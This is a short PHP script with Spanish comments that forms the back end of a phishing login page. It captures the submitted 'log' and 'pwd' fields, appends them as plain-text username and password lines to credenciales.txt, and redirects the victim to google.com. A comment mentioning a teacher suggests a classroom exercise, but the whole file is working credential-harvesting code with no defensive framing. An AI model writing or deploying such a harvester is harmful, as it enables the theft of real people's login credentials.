<?php
// Recibimos los datos del formulario
$usuario = $_POST['log'];
$password = $_POST['pwd'];

// Abrimos (o creamos) un archivo llamado 'credenciales.txt'
$archivo = fopen("credenciales.txt", "a");

// Escribimos los datos capturados
fwrite($archivo, "Usuario: " . $usuario . " | Password: " . $password . "\n");

// Cerramos el archivo
fclose($archivo);

// Enviamos al usuario a Google (o a la página real que te indicó el profe)
header("Location: https://google.com");
exit();
?>
